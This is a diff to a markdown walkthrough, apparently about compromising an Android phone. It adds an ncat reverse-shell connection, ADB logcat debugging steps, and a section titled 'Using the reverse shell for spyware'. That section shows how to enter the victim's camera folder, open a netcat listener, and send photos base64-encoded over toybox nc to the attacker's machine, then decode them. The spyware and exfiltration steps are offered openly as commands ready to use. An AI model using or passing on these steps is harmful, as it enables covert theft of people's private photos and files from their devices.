@@ -134,15 +134,45 @@ ss -tuln
 
 ### Step 7.
 
-Finally, we used the following command to get a reverse shell.
+Finally, we used the following command to enter the reverse shell.
 
 ```bash
-telnet [IP] [6666]
+ncat 192.168.0.180 6666
 ```
 
-Ignore below
+How to debug the app using ADB debugger. First, we need to find the device name using the following command.
+
+```bash
+adb devices
+```
 
 ```bash
 cd D:\Users\Admin\platform-tools_r34.0.5-windows\platform-tools
-.\adb -s 23c00d78cd0c7ece logcat
+adb -s 23c00d78cd0c7ece logcat
+```
+
+## Using the reverse shell for spyware
+
+Once the victim's device is compromised, we can use the reverse shell to send the victim's files to our device. We used the following command to send the victim's files to our device. Navigate to the directory where you want to save the files and then run the following command.
+
+```bash
+cd storage/emulated/0/DCIM/Camera
+```
+
+Open a receiver on your device to receive the files.
+
+```bash
+ncat -l 6667 > file.txt
+```
+
+Inside the reverse shell, run the following command to send the files to your device.
+
+```bash
+cat 20231125_153139.jpg | toybox base64 | toybox nc -w 3 192.168.0.108 6667
+```
+
+This will send the file to your device. You can then decode the image using a converter or the following command. I used one online as I had a Windows machine and the command works for Linux.
+
+```bash
+cat file.txt | toybox base64 -d > file.jpg
 ```
